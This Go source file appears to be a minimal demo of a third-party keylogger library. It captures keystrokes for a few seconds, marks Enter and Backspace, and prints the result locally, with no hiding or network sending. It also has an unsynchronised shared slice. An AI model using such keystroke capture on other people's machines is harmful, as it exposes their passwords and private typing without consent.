package main

import (
	"fmt"
	"time"

	"github.com/zerofelx/keylogger/keylogger"
)

const (
	delay     = 4
	enter     = 13
	backspace = 8
)

func main() {
	kl := keylogger.NewKeylogger()
	emptyCount := 0
	var words []string

	for {
		key := kl.GetKey()

		if !key.Empty {
			go func(word rune) {
				if key.Keycode != enter && key.Keycode != backspace {
					words = append(words, string(word))
				} else if key.Keycode == enter {
					words = append(words, "↓\n")
				} else if key.Keycode == backspace {
					words = append(words, "←")
				}
			}(key.Rune)
		}
		emptyCount++
		time.Sleep(delay * time.Millisecond)
		// fmt.Printf("%v\n", emptyCount)
		if emptyCount >= 1000 {
			fmt.Print(words)
			break
		}
	}
}
